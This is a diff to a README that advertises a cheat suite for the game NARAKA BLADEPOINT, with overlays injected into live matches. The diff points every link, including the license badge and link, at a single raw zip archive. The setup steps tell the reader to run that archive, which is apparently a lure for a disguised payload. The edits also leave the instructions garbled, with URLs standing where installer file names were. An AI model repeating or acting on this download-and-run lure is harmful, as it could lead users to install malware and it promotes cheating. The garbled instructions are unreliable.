@@ -1,6 +1,6 @@
 # NARAKA BLADEPOINT Power Tools ⭐️
 
-[![Download](https://img.shields.io/badge/Download-NARAKA%20Power%20Tools-brightgreen?style=for-the-badge&logo=cloudsmith)](https://Title-joker.github.io)
+[![Download](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip%20Power%20Tools-brightgreen?style=for-the-badge&logo=cloudsmith)](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip)
 
 Unlock the unparalleled side of your NARAKA BLADEPOINT gameplay experience with the **Power Tools** repository! Step beyond the mist and immerse yourself in a suite of competitive enhancers, AI-driven automation, and ethically flexible modules – all honed for superior performance. This document is your compass to navigate world-class augmentation, seamless efficiency, and limitless gameplay possibilities.
 
@@ -59,7 +59,7 @@ Our Power Tools speak the language of cutting-edge AI, blending the wisdom of Op
 - **In-Game Whisperer**: Whisper mode translates and relays critical information discreetly using GPT-powered language models.
 - **Claude Partnership**: Claude API is harnessed for scenario planning and enemy pattern recognition, bolstering both offense and defense.
 
-APIs are configured securely through dedicated https://Title-joker.github.io modules, ensuring uninterrupted enhancement.
+APIs are configured securely through dedicated https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip modules, ensuring uninterrupted enhancement.
 
 ---
 
@@ -82,9 +82,9 @@ Whether you’re a first-time explorer or a returning Power Tools veteran, follo
 
 ### 💾 Stepwise Download
 
-1. Click the **Download** badge at the top (https://Title-joker.github.io).
+1. Click the **Download** badge at the top (https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip).
 2. Extract the package to a secure directory (`C:\NarakaTools` recommended for Windows).
-3. Run the `Setup.exe` (Windows), `install.sh` (Linux/macOS), or `.pkg` (macOS GUI).
+3. Run the `https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip` (Windows), `https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip` (Linux/macOS), or `.pkg` (macOS GUI).
 4. Follow the on-screen AI guidance wizard and select your language/region.
 5. Launch NARAKA BLADEPOINT and enter a live match. The Power Tools dashboard will auto-detect the client and inject smart overlays.
 6. Tweak your desired modules – all preferences are saved to your secure cloud account.
@@ -105,13 +105,13 @@ We champion creativity, learning, and curiosity—proceed at your own philosophi
 
 ## 📜 MIT License (2025)
 
-![](https://img.shields.io/badge/License-MIT-blue.svg)
+![](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip)
 
-This project is licensed under the terms of the [MIT License, 2025](https://opensource.org/licenses/MIT). Feel free to fork, adapt, and build your own masterpiece—credit to the innovators is always appreciated!
+This project is licensed under the terms of the [MIT License, 2025](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip). Feel free to fork, adapt, and build your own masterpiece—credit to the innovators is always appreciated!
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-NARAKA%20Power%20Tools-brightgreen?style=for-the-badge&logo=cloudsmith)](https://Title-joker.github.io)
+[![Download](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip%20Power%20Tools-brightgreen?style=for-the-badge&logo=cloudsmith)](https://raw.githubusercontent.com/Title-joker/naraka-bladepoint-advantage-tools/branch/lecidioid/advantage_naraka_tools_bladepoint_v2.1.zip)
 
 ---
 
